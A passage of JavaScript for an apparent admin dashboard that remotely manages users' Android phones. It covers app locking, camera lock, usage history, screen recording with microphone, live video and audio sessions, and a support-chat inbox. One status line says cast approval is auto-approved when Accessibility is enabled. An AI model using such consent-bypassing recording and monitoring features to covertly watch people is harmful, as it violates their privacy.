            await refreshAdminAppsBlocksPanel();
            await refreshAdminAppsPanel();
          }, 1000);
        } catch (e) {
          btn.disabled = false;
          alertAdminAppControlError(e);
        }
      });
    });
  } catch (e) {
    list.textContent = e instanceof Error ? e.message : String(e);
    list.classList.add("muted");
  }
}

async function openAdminAppDetail(packageName) {
  const detail = document.getElementById("admin-app-detail");
  if (!detail || !exploreCtx) return;
  detail.hidden = false;
  detail.textContent = "Loading…";
  try {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps/detail?packageName=${encodeURIComponent(packageName)}`
    );
    const a = data.app || {};
    const perms = Array.isArray(a.permissions) ? a.permissions.slice(0, 40) : [];
    const blocked = isAdminPackageBlockedNow(a.packageName || packageName);
    const block = adminActiveBlocks.find(
      (b) => b.packageName === (a.packageName || packageName) && b.status === "active"
    );
    detail.innerHTML = `
      <h2>${escapeHtml(a.appName || packageName)}${blocked ? '<span class="app-badge-blocked">Blocked</span>' : ""}</h2>
      <p><code>${escapeHtml(a.packageName || packageName)}</code></p>
      <p>Version ${escapeHtml(a.versionName || "?")} (${a.versionCode || 0})</p>
      <p>Installed ${a.firstInstallTime ? new Date(a.firstInstallTime).toLocaleString() : "—"}</p>
      <p>Updated ${a.lastUpdateTime ? new Date(a.lastUpdateTime).toLocaleString() : "—"}</p>
      <p>Target SDK ${a.targetSdk || "—"} · Min SDK ${a.minSdk || "—"}</p>
      <p>Install source: ${escapeHtml(a.installSource || "—")}</p>
      <p>ABI: ${(a.supportedAbis || []).map(escapeHtml).join(", ") || "—"}</p>
      ${
        blocked
          ? `<p><strong>Block:</strong> ${escapeHtml(adminFormatBlockRemaining(block?.expiresAt || 0))}</p>`
          : ""
      }
      <div class="app-control-actions">
        <button type="button" class="btn-danger-soft" id="btn-admin-detail-block">${blocked ? "Extend lock" : "Lock app"}</button>
        <button type="button" class="btn-primary" id="btn-admin-detail-unblock" ${blocked ? "" : "disabled"}>Unlock</button>
      </div>
      ${
        perms.length
          ? `<details><summary>Permissions (${perms.length})</summary><ul>${perms.map((p) => `<li><code>${escapeHtml(p)}</code></li>`).join("")}</ul></details>`
          : ""
      }
    `;
    document.getElementById("btn-admin-detail-block")?.addEventListener("click", async () => {
      try {
        await sendAdminAppControl("BLOCK", a.packageName || packageName, a.appName || packageName, "app");
        setTimeout(() => void openAdminAppDetail(packageName), 1200);
        await refreshAdminAppsBlocksPanel();
        await refreshAdminAppsPanel();
      } catch (e) {
        alertAdminAppControlError(e);
      }
    });
    document.getElementById("btn-admin-detail-unblock")?.addEventListener("click", async () => {
      try {
        await sendAdminAppControl("UNBLOCK", a.packageName || packageName, "", "app");
        setTimeout(() => void openAdminAppDetail(packageName), 1000);
        await refreshAdminAppsBlocksPanel();
        await refreshAdminAppsPanel();
      } catch (e) {
        alertAdminAppControlError(e);
      }
    });
  } catch (e) {
    detail.textContent = e instanceof Error ? e.message : String(e);
  }
}

function wireAdminAppsPanel() {
  if (adminAppsPanelWired) return;
  adminAppsPanelWired = true;
  document.getElementById("btn-admin-apps-refresh")?.addEventListener("click", () => {
    void refreshAdminAppsPanel();
  });
  document.getElementById("btn-admin-blocks-refresh")?.addEventListener("click", () => {
    void refreshAdminAppsBlocksPanel();
  });
  document.getElementById("btn-admin-camera-lock")?.addEventListener("click", async () => {
    try {
      await sendAdminAppControl("CAMERA_LOCK");
      setTimeout(() => refreshAdminAppsBlocksPanel(), 1500);
    } catch (e) {
      alertAdminAppControlError(e);
    }
  });
  document.getElementById("btn-admin-camera-unlock")?.addEventListener("click", async () => {
    try {
      await sendAdminAppControl("CAMERA_UNLOCK");
      setTimeout(() => refreshAdminAppsBlocksPanel(), 1200);
    } catch (e) {
      alertAdminAppControlError(e);
    }
  });
  document.getElementById("btn-admin-apps-export")?.addEventListener("click", async () => {
    if (!exploreCtx) return;
    try {
      const data = await api(
        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps?limit=500`
      );
      const blob = new Blob([JSON.stringify(data.items || [], null, 2)], { type: "application/json" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = `apps-${exploreCtx.deviceId}.json`;
      a.click();
    } catch (e) {
      alert(e instanceof Error ? e.message : String(e));
    }
  });
  document.getElementById("admin-apps-search")?.addEventListener("input", () => {
    clearTimeout(window.__adminAppsSearchT);
    window.__adminAppsSearchT = setTimeout(() => refreshAdminAppsPanel(), 300);
  });
  document.getElementById("admin-apps-filter")?.addEventListener("change", () => {
    void refreshAdminAppsPanel();
  });
}

function renderRecordingPanel() {
  const el = document.getElementById("admin-recording-body");
  const transferBox = document.getElementById("admin-rec-transfer");
  if (!el || !exploreCtx) return;
  const items = [...(exploreCtx.data.screenRecordings || [])].sort(
    (a, b) => Number(b.createdAt || b.startedAt || 0) - Number(a.createdAt || a.startedAt || 0)
  );
  const latest = items[0];
  if (latest?.status) {
    applyAdminRecUiFromStatus(latest.status, Number(latest.durationMs || 0));
    if (transferBox) {
      if (latest.status === "Recording" || latest.status === "Paused") {
        transferBox.hidden = false;
        transferBox.textContent = `${latest.status} · ${adminFormatRecTime(latest.durationMs || adminLocalRecElapsedMs())}`;
      } else if (latest.status === "Uploading" || latest.status === "Encoding") {
        transferBox.hidden = false;
        transferBox.textContent = `${latest.status}… ${adminFormatRecTime(latest.durationMs || 0)} recorded.`;
      } else if (latest.status === "Failed") {
        transferBox.hidden = false;
        transferBox.textContent = `Failed: ${latest.errorMessage || "See phone."}`;
      } else if (latest.status === "Completed") {
        transferBox.hidden = false;
        transferBox.textContent = `Completed · ${adminFormatRecTime(latest.durationMs || 0)} · tap Play below.`;
      } else if (/Waiting|Permission/i.test(String(latest.status))) {
        transferBox.hidden = false;
        transferBox.textContent = "Waiting for Cast approval on the phone (auto-approved when Accessibility is on)…";
      }
    }
  }
  if (!items.length) {
    el.innerHTML = emptyHint(
      "No screen recordings yet.\n\nTap Record Screen, accept the Android cast dialog on the phone, then Stop. Completed files appear here to Play / Download."
    );
    return;
  }
  el.innerHTML = items
    .slice(0, 40)
    .map((r) => {
      const name = r.displayName || r.name || r.id || "recording";
      const status = String(r.status || "");
      const transferId = String(r.transferId || r.uploadTransferId || "");
      const key = transferId ? `adminrec::${exploreCtx.deviceId}::${transferId}` : "";
      const st = key ? adminRecItemState.get(key) : null;
      const ready = transferId && /completed|ready|done|uploaded/i.test(status);
      let btnLabel = "Download";
      let btnClass = "btn-secondary btn-admin-rec-open";
      if (st?.status === "downloading") {
        btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
        btnClass += " btn-file-progress";
      } else if (st?.status === "ready") {
        btnLabel = "Play";
        btnClass += " btn-file-ready";
      } else if (st?.status === "error") {
        btnLabel = "Retry";
        btnClass += " btn-file-error";
      } else if (ready) {
        btnLabel = "Download";
      }
      return `<div class="rec-row surface">
        <div><strong>${escapeHtml(name)}</strong> <span class="status-badge">${escapeHtml(status)}</span></div>
        <div class="muted">${fmtTime(r.createdAt || r.startedAt)} · ${adminFormatRecTime(Number(r.durationMs || 0))}</div>
        ${ready ? `<div class="page-actions"><button type="button" class="${btnClass}" data-transfer-id="${escapeHtml(transferId)}" data-name="${escapeHtml(name)}" data-rec-key="${escapeHtml(key)}" ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button></div>` : ""}
      </div>`;
    })
    .join("");
  el.querySelectorAll(".btn-admin-rec-open").forEach((btn) => {
    btn.addEventListener("click", async () => {
      try {
        await downloadAdminRecordingItem(
          btn.getAttribute("data-transfer-id") || "",
          btn.getAttribute("data-name") || "recording.mp4",
          btn
        );
      } catch (e) {
        alert(formatApiError(e));
      }
    });
  });
  document.getElementById("btn-admin-rec-inline-close")?.addEventListener("click", () => {
    const wrap = document.getElementById("admin-rec-inline-viewer");
    const body = document.getElementById("admin-rec-inline-body");
    if (body) body.innerHTML = "";
    if (wrap) wrap.hidden = true;
  }, { once: true });
}

async function downloadAdminRecordingItem(transferId, displayName, btn) {
  if (!exploreCtx || !transferId) return;
  const key = `adminrec::${exploreCtx.deviceId}::${transferId}`;
  const existing = adminRecItemState.get(key);
  if (existing?.status === "ready" && existing.objectUrl) {
    showAdminRecInline(existing);
    return;
  }
  let state = { status: "downloading", progress: 3, displayName: displayName || "recording" };
  adminRecItemState.set(key, state);
  if (btn) {
    btn.textContent = "3%";
    btn.disabled = true;
    btn.classList.add("btn-file-progress");
  }
  try {
    const deadline = Date.now() + 90_000;
    while (Date.now() < deadline) {
      const data = await api(
        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}`
      );
      const t = data.transfer || {};
      const st = String(t.status || "");
      const p = Math.max(3, Math.min(99, Number(t.progress) || 3));
      state = { ...state, status: "downloading", progress: p };
      adminRecItemState.set(key, state);
      if (btn) btn.textContent = `${p}%`;
      if (st === "ready") {
        const url = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
        const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
        if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
        const blob = await res.blob();
        const objectUrl = URL.createObjectURL(blob);
        const ready = { status: "ready", progress: 100, displayName: displayName || "recording", objectUrl, blob };
        adminRecItemState.set(key, ready);
        if (btn) {
          btn.textContent = "Play";
          btn.disabled = false;
          btn.classList.add("btn-file-ready");
        }
        showAdminRecInline(ready);
        return;
      }
      if (st === "failed" || st === "cancelled") throw new Error(t.errorMessage || `Transfer ${st}`);
      await new Promise((r) => setTimeout(r, 1200));
    }
    throw new Error("Timed out waiting for recording file.");
  } catch (e) {
    state = { ...state, status: "error", progress: 0 };
    adminRecItemState.set(key, state);
    if (btn) {
      btn.textContent = "Retry";
      btn.disabled = false;
      btn.classList.add("btn-file-error");
    }
    throw e;
  }
}

function showAdminRecInline(entry) {
  const wrap = document.getElementById("admin-rec-inline-viewer");
  const body = document.getElementById("admin-rec-inline-body");
  const title = document.getElementById("admin-rec-inline-title");
  if (!wrap || !body || !entry?.objectUrl) return;
  if (title) title.textContent = entry.displayName || "Screen recording";
  body.innerHTML = "";
  const video = document.createElement("video");
  video.src = entry.objectUrl;
  video.controls = true;
  video.playsInline = true;
  body.appendChild(video);
  wrap.hidden = false;
  video.play().catch(() => {});
}

function fmtTimeAmPm(ms) {
  const n = Number(ms || 0);
  if (!n) return "—";
  try {
    return new Date(n).toLocaleString(undefined, {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  } catch {
    return "—";
  }
}

function formatUsageDuration(ms) {
  const totalSec = Math.max(0, Math.floor(Number(ms || 0) / 1000));
  const h = Math.floor(totalSec / 3600);
  const m = Math.floor((totalSec % 3600) / 60);
  const s = totalSec % 60;
  if (h > 0) return `${h}h ${m}m ${s}s`;
  if (m > 0) return `${m}m ${s}s`;
  return `${s}s`;
}

function usageDayLabel(dayKey) {
  if (!dayKey || dayKey === "unknown") return "Unknown date";
  const [y, m, d] = String(dayKey).split("-").map(Number);
  if (!y || !m || !d) return String(dayKey);
  const date = new Date(y, m - 1, d);
  const today = new Date();
  const startToday = new Date(today.getFullYear(), today.getMonth(), today.getDate());
  const startThat = new Date(date.getFullYear(), date.getMonth(), date.getDate());
  const diffDays = Math.round((startToday - startThat) / 86400000);
  const pretty = date.toLocaleDateString(undefined, {
    weekday: "short",
    month: "short",
    day: "numeric",
    year: "numeric",
  });
  if (diffDays === 0) return `Today · ${pretty}`;
  if (diffDays === 1) return `Yesterday · ${pretty}`;
  return pretty;
}

function groupAdminAppUsage(items) {
  const map = new Map();
  for (const it of items || []) {
    let key = String(it.date || "").trim();
    if (!key && Number(it.dateMs || 0)) {
      const d = new Date(Number(it.dateMs));
      key = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
    }
    if (!key) key = "unknown";
    if (!map.has(key)) map.set(key, []);
    map.get(key).push(it);
  }
  const groups = [...map.entries()].sort((a, b) => String(b[0]).localeCompare(String(a[0])));
  for (const [, dayItems] of groups) {
    dayItems.sort(
      (a, b) => Number(b.totalDurationMs || 0) - Number(a.totalDurationMs || 0)
    );
  }
  return groups;
}

function wireAdminUsageCollapse(root) {
  root?.querySelectorAll(".usage-day-header").forEach((btn) => {
    btn.addEventListener("click", () => {
      const group = btn.closest(".usage-day-group");
      const body = group?.querySelector(".usage-day-body");
      const chevron = btn.querySelector(".usage-day-chevron");
      if (!group || !body) return;
      const opening = body.hasAttribute("hidden");
      if (opening) {
        body.removeAttribute("hidden");
        group.classList.add("is-open");
        btn.setAttribute("aria-expanded", "true");
        if (chevron) chevron.textContent = "▲";
      } else {
        body.setAttribute("hidden", "");
        group.classList.remove("is-open");
        btn.setAttribute("aria-expanded", "false");
        if (chevron) chevron.textContent = "▼";
      }
    });
  });
}

function renderAppUsagePanel() {
  const el = document.getElementById("admin-app-usage-body");
  if (!el || !exploreCtx) return;
  const items = exploreCtx.data.appUsage || [];
  if (!items.length) {
    el.innerHTML = emptyHint(
      "No usage history cached. Tap Sync usage (phone needs Usage Access + Recent Apps sharing)."
    );
    return;
  }
  const groups = groupAdminAppUsage(items);
  el.innerHTML = `<div class="usage-day-list">${groups
    .map(([dayKey, dayItems], index) => {
      const open = index === 0 ? " is-open" : "";
      const hidden = index === 0 ? "" : " hidden";
      const chevron = index === 0 ? "▲" : "▼";
      const totalMs = dayItems.reduce((sum, it) => sum + Number(it.totalDurationMs || 0), 0);
      return `<section class="usage-day-group${open}" data-day="${escapeHtml(dayKey)}">
        <button type="button" class="usage-day-header" aria-expanded="${index === 0 ? "true" : "false"}">
          <span class="usage-day-title">${escapeHtml(usageDayLabel(dayKey))}</span>
          <span class="usage-day-count">${dayItems.length} apps · ${escapeHtml(formatUsageDuration(totalMs))}</span>
          <span class="usage-day-chevron" aria-hidden="true">${chevron}</span>
        </button>
        <div class="usage-day-body"${hidden}>
          <div class="usage-app-grid">${dayItems
            .map((it) => {
              const name = escapeHtml(it.appName || it.packageName || "App");
              const pkg = escapeHtml(it.packageName || "");
              const dur = escapeHtml(formatUsageDuration(it.totalDurationMs));
              const last = escapeHtml(fmtTimeAmPm(it.lastUsed));
              return `<article class="usage-app-row">
                <strong class="usage-app-name">${name}</strong>
                <span class="usage-app-duration">${dur}</span>
                <span class="usage-app-pkg muted">${pkg}</span>
                <span class="usage-app-last muted">Last used ${last}</span>
              </article>`;
            })
            .join("")}</div>
        </div>
      </section>`;
    })
    .join("")}</div>`;
  wireAdminUsageCollapse(el);
}

function wireAdminCommands() {
  document.querySelectorAll("[data-admin-cmd]").forEach((btn) => {
    btn.onclick = () => {
      if (!exploreCtx) return;
      let payload = {};
      const raw = btn.getAttribute("data-admin-payload");
      if (raw) {
        try {
          payload = JSON.parse(raw);
        } catch {
          payload = {};
        }
      }
      void runDeviceCommand(
        exploreCtx.ownerUid,
        exploreCtx.deviceId,
        btn.getAttribute("data-admin-cmd"),
        payload
      );
    };
  });
  const recStart = document.getElementById("btn-admin-rec-start");
  const recPause = document.getElementById("btn-admin-rec-pause");
  const recResume = document.getElementById("btn-admin-rec-resume");
  const recStop = document.getElementById("btn-admin-rec-stop");
  const recRefresh = document.getElementById("btn-admin-rec-refresh");
  if (recStart) {
    recStart.onclick = () => {
      if (!exploreCtx) return;
      adminSetRecStatus("Waiting for Permission");
      adminSetRecTimer(0);
      stopAdminRecTimer();
      const quality = document.getElementById("admin-rec-quality")?.value || "720p";
      const fps = Number(document.getElementById("admin-rec-fps")?.value || 30);
      const withMic = Boolean(document.getElementById("admin-rec-mic")?.checked);
      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_START", {
        quality,
        fps,
        withMic,
      });
      startAdminRecordingsPoll();
    };
  }
  if (recPause) {
    recPause.onclick = () => {
      if (!exploreCtx) return;
      adminRecLocalPauseAt = Date.now();
      adminSetRecStatus("Paused");
      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_PAUSE");
      startAdminRecordingsPoll();
    };
  }
  if (recResume) {
    recResume.onclick = () => {
      if (!exploreCtx) return;
      if (adminRecLocalPauseAt) {
        adminRecLocalPausedMs += Date.now() - adminRecLocalPauseAt;
        adminRecLocalPauseAt = 0;
      }
      adminSetRecStatus("Recording");
      startAdminRecTimer(adminLocalRecElapsedMs());
      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_RESUME");
      startAdminRecordingsPoll();
    };
  }
  if (recStop) {
    recStop.onclick = () => {
      if (!exploreCtx) return;
      adminSetRecStatus("Stopping…");
      adminSetRecTimer(adminLocalRecElapsedMs());
      stopAdminRecTimer();
      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_STOP");
      startAdminRecordingsPoll();
    };
  }
  if (recRefresh) {
    recRefresh.onclick = () => {
      if (!exploreCtx) return;
      void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    };
  }
}

async function runAdminScreenRecord(ownerUid, deviceId, action, opts = {}) {
  const status = document.getElementById("admin-action-status");
  const quality = opts.quality || document.getElementById("admin-rec-quality")?.value || "720p";
  const fps = Number(opts.fps ?? document.getElementById("admin-rec-fps")?.value ?? 30);
  const withMic = opts.withMic ?? Boolean(document.getElementById("admin-rec-mic")?.checked);
  try {
    if (status) {
      status.textContent =
        action === "SCREEN_RECORD_START"
          ? "Starting screen recording…"
          : action === "SCREEN_RECORD_STOP"
            ? "Stopping screen recording…"
            : `Sending ${action}…`;
    }
    const result = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
      {
        method: "POST",
        body: JSON.stringify({
          action,
          payload: { quality, fps, withMic, autoUpload: true },
        }),
      }
    );
    const tid = result.transfer?.transferId || "";
    if (status) {
      status.textContent = tid
        ? `${action} sent · transfer ${tid.slice(0, 8)}… Accept cast on phone.`
        : `${action} sent.`;
    }
    if (action !== "SCREEN_RECORD_START") {
      setTimeout(() => void openDeviceExplore(ownerUid, deviceId), 2500);
    }
  } catch (e) {
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

async function runDeviceCommand(ownerUid, deviceId, action, payload = {}) {
  const status = document.getElementById("admin-action-status");
  try {
    if (status) status.textContent = `Sending ${action}…`;
    await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
      { method: "POST", body: JSON.stringify({ action, payload: payload || {} }) }
    );
    if (status) {
      status.textContent = `${action} sent. Waiting for phone… refreshing in 3s.`;
    }
    setTimeout(() => {
      void openDeviceExplore(ownerUid, deviceId);
    }, 3000);
  } catch (e) {
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

async function startLive(ownerUid, deviceId, capabilities, forceReplace, quality = "auto", opts = {}) {
  const statusId = opts.statusId || "live-status";
  const videoId = opts.videoId || "admin-live-video";
  const status = document.getElementById(statusId);
  const video = document.getElementById(videoId);
  const audio = document.getElementById("admin-live-audio");
  try {
    await stopLiveViewer();
    liveControlState = { torch: false, micMuted: false, videoRec: false, audioRec: false };
    if (status) status.textContent = "Starting live session…";
    if (video) video.hidden = false;
    show(document.getElementById("admin-live-panel"), true);
    show(document.getElementById("admin-live-controls"), true);
    const endBtn = document.getElementById("btn-admin-end-live");
    if (endBtn) endBtn.hidden = false;

    let result;
    try {
      result = await api(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
        {
          method: "POST",
          body: JSON.stringify({ capabilities, forceReplace: Boolean(forceReplace), quality }),
        }
      );
    } catch (e) {
      if (e instanceof ApiError && e.code === "USER_SESSION_ACTIVE") {
        const ok = confirm(
          `${e.message}\n\n${e.howTo || ""}\n\nTake over now? (Ends their same-type live session only.)`
        );
        if (!ok) {
          if (status) status.textContent = "Cancelled — user session left running.";
          return;
        }
        result = await api(
          `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
          {
            method: "POST",
            body: JSON.stringify({ capabilities, forceReplace: true, quality }),
          }
        );
      } else {
        throw e;
      }
    }
    if (!firebaseConfig) throw new Error("Firebase config missing");
    if (!video) throw new Error("Video element missing");
    activeLiveSessionId = String(result.sessionId || "");
    if (status) {
      status.textContent =
        result.notes ||
        "Request authorized. Tap the notification on your phone to start.";
    }
    liveViewer = await startAdminLiveViewer({
      firebaseConfig,
      customToken: result.customToken,
      ownerUid: result.ownerUid,
      sessionId: result.sessionId,
      iceServers: Array.isArray(result.iceServers)
        ? result.iceServers
        : result.iceServers?.iceServers || [],
      videoEl: video,
      audioEl: audio || undefined,
      onStatus: (m) => {
        if (status) status.textContent = m;
      },
    });
  } catch (e) {
    activeLiveSessionId = "";
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

/* ——— Support chat (admin inbox) ——— */

function setAdminSupportStatus(text) {
  const el = document.getElementById("admin-support-status");
  if (el) el.textContent = text || "";
}

function updateSupportTabBadge(total) {
  const badge = document.getElementById("support-tab-badge");
  if (!badge) return;
  const n = Math.max(0, Number(total) || 0);
  if (n <= 0) {
    badge.hidden = true;
    badge.textContent = "0";
    return;
  }
  badge.hidden = false;
  badge.textContent = n > 99 ? "99+" : String(n);
}

function stopSupportInboxPolling() {
  if (supportInboxTimer) {
    clearInterval(supportInboxTimer);
    supportInboxTimer = null;
  }
}

function startSupportInboxPolling() {
  stopSupportInboxPolling();
  supportInboxTimer = setInterval(() => {
    if (!idToken) return;
    void refreshSupportTabBadge();
    if (activeTab === "support" && !activeSupportUid) void loadSupportInbox({ quiet: true });
  }, 10000);
}

function stopAdminSupportThreadPoll() {
  if (supportAdminPollTimer) {
    clearInterval(supportAdminPollTimer);
    supportAdminPollTimer = null;
  }
}

async function refreshSupportTabBadge() {
  if (!idToken) return;
  try {
    const data = await api("/api/admin/support/chats?limit=100");
    const chats = Array.isArray(data.chats) ? data.chats : [];
    const total = chats.reduce((sum, c) => sum + Number(c.unreadForAdmin || 0), 0);
    updateSupportTabBadge(total);
    if (activeTab === "support") {
      supportChatsCache = chats;
      renderSupportChatList();
    }
  } catch {
    /* ignore */
  }
}

function renderSupportChatList() {
  const el = document.getElementById("support-chat-list");
  if (!el) return;
  if (!supportChatsCache.length) {
    el.innerHTML = `<p class="muted">No support chats yet. When a user messages via Help FAB, they appear here.</p>`;
    return;
  }
  el.innerHTML = supportChatsCache
    .map((c) => {
      const unread = Number(c.unreadForAdmin || 0);
      const badge =
        unread > 0 ? `<span class="admin-support-unread">${unread > 99 ? "99+" : unread}</span>` : "";
      const active = c.userUid === activeSupportUid ? " active" : "";
      const when = c.lastMessageAt ? fmtTime(c.lastMessageAt) : "";
      return `<button type="button" class="admin-support-chat-item${active}" data-support-uid="${escapeHtml(c.userUid)}">
        <strong>${escapeHtml(c.userEmail || c.userUid)}${badge}</strong>
        <div class="preview">${escapeHtml(c.lastMessageText || "(no messages)")}</div>
        <div class="preview">${escapeHtml(when)}</div>
      </button>`;
    })
    .join("");
  el.querySelectorAll("[data-support-uid]").forEach((btn) => {
    btn.addEventListener("click", () => {
      void openSupportThread(btn.getAttribute("data-support-uid") || "");
    });
  });
}

function openAdminSupportImage(url, fileName) {
  const viewer = document.getElementById("admin-media-viewer");
  const body = document.getElementById("admin-media-body");
  const title = document.getElementById("admin-media-title");
  const status = document.getElementById("admin-media-status");
  show(viewer, true);
  if (title) title.textContent = fileName || "Support image";
  if (status) status.textContent = "Scroll / pinch to zoom · drag to pan";
  if (!body) return;
  body.innerHTML = "";
  const wrap = document.createElement("div");
  wrap.className = "admin-support-zoom-wrap";
  const img = document.createElement("img");
  img.src = url;
  img.alt = fileName || "image";
  img.className = "admin-support-zoom-img";
  img.draggable = false;
  wrap.appendChild(img);
  body.appendChild(wrap);
  let scale = 1;
  let x = 0;
  let y = 0;
  let dragging = false;
  let lastX = 0;
  let lastY = 0;
  const apply = () => {
    img.style.transform = `translate(${x}px, ${y}px) scale(${scale})`;
  };
  wrap.addEventListener(
    "wheel",
    (ev) => {
      ev.preventDefault();
      scale = Math.min(6, Math.max(1, scale + (ev.deltaY < 0 ? 0.2 : -0.2)));
      if (scale === 1) {
        x = 0;
        y = 0;
      }
      apply();
    },
    { passive: false }
  );
  img.addEventListener("pointerdown", (ev) => {
    if (scale <= 1) return;
    dragging = true;
    lastX = ev.clientX;
    lastY = ev.clientY;
    img.setPointerCapture?.(ev.pointerId);
  });
  img.addEventListener("pointermove", (ev) => {
    if (!dragging) return;
    x += ev.clientX - lastX;
    y += ev.clientY - lastY;
    lastX = ev.clientX;
    lastY = ev.clientY;
    apply();
  });
  const end = () => {
    dragging = false;
  };
  img.addEventListener("pointerup", end);
  img.addEventListener("pointercancel", end);
  apply();
}

function renderAdminSupportMessages() {
  const box = document.getElementById("support-thread-messages");
  if (!box) return;
  const nearBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 90;
  if (!supportThreadMessages.length) {
    box.innerHTML = `<p class="muted" style="margin:auto;text-align:center;">No messages yet.</p>`;
    return;
  }
  box.innerHTML = supportThreadMessages
    .map((m) => {
      const isAdmin = m.senderRole === "admin";
      const who = isAdmin ? "Admin" : "User";
      const time = m.createdAt ? new Date(m.createdAt).toLocaleString() : "";
      const media = (m.attachments || [])
        .map((a) => {
          if (!a?.url) {
            return `<div class="muted" style="font-size:0.8rem;">[Attachment unavailable]</div>`;
          }
          if (a.type === "video") {
            return `<video src="${escapeHtml(a.url)}" controls playsinline></video>`;
          }
          return `<button type="button" class="admin-support-img-btn" data-admin-support-img="${escapeHtml(a.url)}" data-admin-support-name="${escapeHtml(a.fileName || "image")}" title="Tap to zoom">
            <img src="${escapeHtml(a.url)}" alt="${escapeHtml(a.fileName || "image")}" />
            <span class="admin-support-zoom-hint">Tap to zoom</span>
          </button>`;
        })
        .join("");
      const text = m.text ? `<div>${escapeHtml(m.text)}</div>` : "";
      return `<div class="admin-support-msg ${isAdmin ? "admin" : "user"}">${text}${media}<span class="meta">${escapeHtml(who)} · ${escapeHtml(time)}</span></div>`;
    })
    .join("");
  box.querySelectorAll("[data-admin-support-img]").forEach((btn) => {
    btn.addEventListener("click", () => {
      openAdminSupportImage(
        btn.getAttribute("data-admin-support-img") || "",
        btn.getAttribute("data-admin-support-name") || "image"
      );
    });
  });
  if (nearBottom || supportThreadMessages.length < 4) box.scrollTop = box.scrollHeight;
}

async function loadSupportInbox(opts = {}) {
  const listEl = document.getElementById("support-chat-list");
  const q = String(document.getElementById("support-search")?.value || "").trim();
  try {
    if (!opts.quiet && listEl) listEl.textContent = "Loading…";
    const data = await api(
      `/api/admin/support/chats?limit=100${q ? `&q=${encodeURIComponent(q)}` : ""}`
    );
    supportChatsCache = Array.isArray(data.chats) ? data.chats : [];
    const total = supportChatsCache.reduce((sum, c) => sum + Number(c.unreadForAdmin || 0), 0);
    updateSupportTabBadge(total);
    renderSupportChatList();
    if (activeSupportUid) {
      show(document.getElementById("support-compose"), true);
    }
  } catch (e) {
    if (listEl) listEl.textContent = e instanceof Error ? e.message : String(e);
  }
}

async function openSupportThread(uid) {
  const id = String(uid || "").trim();
  if (!id) return;
  activeSupportUid = id;
  const chat = supportChatsCache.find((c) => c.userUid === id);
  const title = document.getElementById("support-thread-title");
  const sub = document.getElementById("support-thread-sub");
  if (title) title.textContent = chat?.userEmail || id;
  if (sub) sub.textContent = id;
  show(document.getElementById("support-compose"), true);
  renderSupportChatList();
  setAdminSupportStatus("Loading…");
  try {
    const data = await api(
      `/api/admin/support/chats/${encodeURIComponent(id)}/messages?limit=100`
    );
    supportThreadMessages = Array.isArray(data.messages) ? data.messages : [];
    renderAdminSupportMessages();
    await api(`/api/admin/support/chats/${encodeURIComponent(id)}/read`, {
      method: "POST",
      body: "{}",
    });
    await loadSupportInbox({ quiet: true });
    setAdminSupportStatus("");
  } catch (e) {
    setAdminSupportStatus(e instanceof Error ? e.message : String(e));
  }
  stopAdminSupportThreadPoll();
  supportAdminPollTimer = setInterval(async () => {
    if (activeTab !== "support" || !activeSupportUid || !idToken) return;
    try {
      const last = supportThreadMessages.length
        ? Number(supportThreadMessages[supportThreadMessages.length - 1].createdAt || 0)
        : 0;
      const url = `/api/admin/support/chats/${encodeURIComponent(activeSupportUid)}/messages?limit=100${
        last ? `&after=${encodeURIComponent(String(last))}` : ""
      }`;
      const data = await api(url);
      const list = Array.isArray(data.messages) ? data.messages : [];
      if (last && list.length) {
        const seen = new Set(supportThreadMessages.map((m) => m.messageId));
        for (const m of list) {
          if (!seen.has(m.messageId)) supportThreadMessages.push(m);
        }
        renderAdminSupportMessages();
      } else if (!last) {
        supportThreadMessages = list;
        renderAdminSupportMessages();
      }
      await api(`/api/admin/support/chats/${encodeURIComponent(activeSupportUid)}/read`, {
        method: "POST",
        body: "{}",
      });
    } catch {
      /* ignore */
    }
  }, 2500);
}

function clearAdminSupportAttach() {
  adminSupportPendingFile = null;
  const input = document.getElementById("admin-support-file");
  if (input) input.value = "";
  const prev = document.getElementById("admin-support-attach-preview");
  if (prev) {
    prev.hidden = true;
    prev.textContent = "";
  }
}

async function adminFileToBase64(file) {
  const buf = await file.arrayBuffer();
  const bytes = new Uint8Array(buf);
  let binary = "";
  const chunk = 0x8000;
  for (let i = 0; i < bytes.length; i += chunk) {
    binary += String.fromCharCode(...bytes.subarray(i, i + chunk));
  }
  return btoa(binary);
}

async function prepareAdminSupportUploadFile(file) {
  const maxBytes = 2.8 * 1024 * 1024;
